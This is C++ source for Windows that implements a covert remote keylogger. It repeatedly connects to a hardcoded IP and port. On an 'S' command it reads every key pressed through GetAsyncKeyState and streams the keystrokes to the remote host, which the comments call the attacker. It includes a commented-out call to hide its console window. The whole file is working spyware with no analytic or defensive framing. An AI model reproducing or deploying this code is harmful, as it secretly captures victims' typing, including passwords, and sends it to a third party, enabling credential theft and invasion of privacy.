#define _WINSOCK_DEPRECATED_NO_WARNINGS     
#pragma comment(lib, "Ws2_32.lib")
#include <iostream>
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string>
#include <windows.h>

int main()
{
while(1)
{
char t[1],banner[47]="Welcome back Sir. Now sit back and relax... : ";
//ShowWindow(GetConsoleWindow(), SW_HIDE);
WSADATA WSAData;
SOCKET server;
SOCKADDR_IN addr;
WSAStartup(MAKEWORD(2, 0), &WSAData);
server = socket(AF_INET, SOCK_STREAM, 0);
addr.sin_addr.s_addr = inet_addr("192.168.43.206");
addr.sin_family = AF_INET;
addr.sin_port = htons(5555);

while(connect(server, (SOCKADDR *)&addr, sizeof(addr))==0);
std::cout << "Requesting" << std::endl;    //Debug : To check Connect requests

recv(server,t,1,0);              // receive t="S" to start ; t="T" to terminate this code ; and anything else to abuse if not authorised.
Sleep(20);
//std::cout<<t;                          // Debug Part
if(t[0]=='S')
{
 send(server, banner, 47 , 0);     //Banner
	while (TRUE) 
{  Sleep(80);     //Adjusting capture speed to bypass banner(Earlier it was overlapping banner)
for (int KEY = 0x8; KEY < 0xFF; KEY++)         //capturing all printable keys
{
	if (GetAsyncKeyState(KEY) & 0x8000)        // using highest bit checker (0x8000)          otherway : (GetAsyncKeyState(KEY) == -32767) 
	 {
	char buffer[1];
	buffer[0] = KEY;
	send(server, buffer, sizeof(buffer), 0);
	Sleep(50);      //for controlling capture speed
	 }
}
if(send(server, "", 0 , 0)==SOCKET_ERROR)       // to close if attacker disconnects
 break;
}
}   
else if(t[0]=='T')
{
	send(server, "BYE", 3 , 0);
	exit(0);
}
else
{
     send(server, "-----FUCK OFF-----", 18 , 0);
     Sleep(10);
}

closesocket(server);
WSACleanup();
}

}
